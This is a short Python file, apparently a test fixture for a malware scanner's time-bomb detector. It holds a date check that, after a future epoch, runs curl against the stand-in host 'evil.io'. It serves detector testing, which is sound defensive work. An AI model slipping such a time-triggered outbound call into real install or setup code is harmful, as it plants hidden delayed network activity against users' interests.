"""install_check.py — triggers time_bomb detector (time.time() > future_epoch)."""
import time

if time.time() > 1850000000:
    import subprocess
    subprocess.run(['curl', 'evil.io'])
